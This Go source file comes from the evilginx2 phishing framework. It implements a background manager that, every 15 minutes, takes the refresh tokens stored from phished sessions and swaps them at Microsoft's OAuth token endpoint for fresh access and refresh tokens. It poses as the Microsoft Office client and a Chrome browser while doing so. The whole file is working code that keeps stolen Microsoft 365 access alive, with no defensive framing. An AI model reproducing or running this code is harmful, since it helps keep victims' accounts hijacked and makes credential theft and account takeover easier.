package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	// Token refresh interval - refresh every 15 minutes to keep tokens fresh
	TOKEN_REFRESH_INTERVAL = 15 * time.Minute
	// Microsoft OAuth token endpoint
	MS_REFRESH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	// Default client ID for device code refresh (Microsoft Office)
	DEFAULT_REFRESH_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	// Offline access scope for refresh token
	DEFAULT_REFRESH_SCOPE = "offline_access openid profile https://graph.microsoft.com/.default"
)

// TokenRefreshResponse from Microsoft's token endpoint
type TokenRefreshResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token,omitempty"`
}

// TokenRefreshError when token refresh fails
type TokenRefreshError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// TokenAutoRefreshManager handles automatic token refresh for all sessions
type TokenAutoRefreshManager struct {
	db       *database.Database
	stopChan chan struct{}
	running  bool
	mu       sync.RWMutex
}

// NewTokenAutoRefreshManager creates a new auto-refresh manager
func NewTokenAutoRefreshManager(db *database.Database) *TokenAutoRefreshManager {
	return &TokenAutoRefreshManager{
		db:       db,
		stopChan: make(chan struct{}),
		running:  false,
	}
}

// Start begins the background auto-refresh routine
func (m *TokenAutoRefreshManager) Start() {
	m.mu.Lock()
	if m.running {
		m.mu.Unlock()
		return
	}
	m.running = true
	m.mu.Unlock()

	go m.autoRefreshLoop()
	log.Info("[autorefresh] Token auto-refresh started (interval: %v)", TOKEN_REFRESH_INTERVAL)
}

// Stop terminates the auto-refresh routine
func (m *TokenAutoRefreshManager) Stop() {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.running {
		close(m.stopChan)
		m.running = false
		log.Info("[autorefresh] Token auto-refresh stopped")
	}
}

// IsRunning returns whether the auto-refresh is active
func (m *TokenAutoRefreshManager) IsRunning() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.running
}

// autoRefreshLoop runs the periodic token refresh
func (m *TokenAutoRefreshManager) autoRefreshLoop() {
	// Do initial refresh on startup
	m.refreshAllTokens()

	ticker := time.NewTicker(TOKEN_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.refreshAllTokens()
		case <-m.stopChan:
			return
		}
	}
}

// refreshAllTokens iterates all sessions and refreshes tokens
func (m *TokenAutoRefreshManager) refreshAllTokens() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		log.Error("[autorefresh] Failed to list sessions: %v", err)
		return
	}

	refreshed := 0
	failed := 0

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		// Attempt to refresh
		newAccess, newRefresh, err := m.doRefresh(refreshToken)
		if err != nil {
			log.Warning("[autorefresh] [%d] %s failed: %v", s.Id, maskToken(refreshToken), err)
			failed++
			continue
		}

		// Update database with new tokens
		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			log.Error("[autorefresh] [%d] Failed to save access token: %v", s.Id, err)
			continue
		}

		// Update refresh token if a new one was issued
		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				log.Error("[autorefresh] [%d] Failed to save refresh token: %v", s.Id, err)
				continue
			}
		}

		refreshed++
		log.Success("[autorefresh] [%d] Token refreshed successfully", s.Id)
	}

	if refreshed > 0 || failed > 0 {
		log.Info("[autorefresh] Refresh cycle complete: %d refreshed, %d failed", refreshed, failed)
	}
}

// doRefresh performs the actual OAuth refresh request
func (m *TokenAutoRefreshManager) doRefresh(refreshToken string) (accessToken string, newRefreshToken string, err error) {
	data := url.Values{}
	data.Set("client_id", DEFAULT_REFRESH_CLIENT_ID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", DEFAULT_REFRESH_SCOPE)

	req, err := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenRefreshError
		json.Unmarshal(body, &errResp)
		return "", "", fmt.Errorf("%s: %s", errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return "", "", fmt.Errorf("failed to parse response: %v", err)
	}

	return tokenResp.AccessToken, tokenResp.RefreshToken, nil
}

// RefreshSessionToken manually refreshes a specific session's token
func (m *TokenAutoRefreshManager) RefreshSessionToken(sessionId string) error {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return fmt.Errorf("session has no custom data")
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			return fmt.Errorf("session has no refresh token")
		}

		newAccess, newRefresh, err := m.doRefresh(refreshToken)
		if err != nil {
			return err
		}

		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			return fmt.Errorf("failed to save access token: %v", err)
		}

		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				return fmt.Errorf("failed to save refresh token: %v", err)
			}
		}

		log.Success("[autorefresh] Session %s token refreshed", sessionId)
		return nil
	}

	return fmt.Errorf("session not found: %s", sessionId)
}

// GetRefreshStats returns statistics about token refresh status
func (m *TokenAutoRefreshManager) GetRefreshStats() (total int, withRefresh int) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return 0, 0
	}

	total = len(sessions)
	for _, s := range sessions {
		if s.Custom != nil {
			if rt, ok := s.Custom["dc_refresh_token"]; ok && rt != "" {
				withRefresh++
			}
		}
	}
	return total, withRefresh
}

// maskToken returns a masked version of the token for logging
func maskToken(token string) string {
	if len(token) <= 20 {
		return "***"
	}
	return token[:8] + "..." + token[len(token)-8:]
}
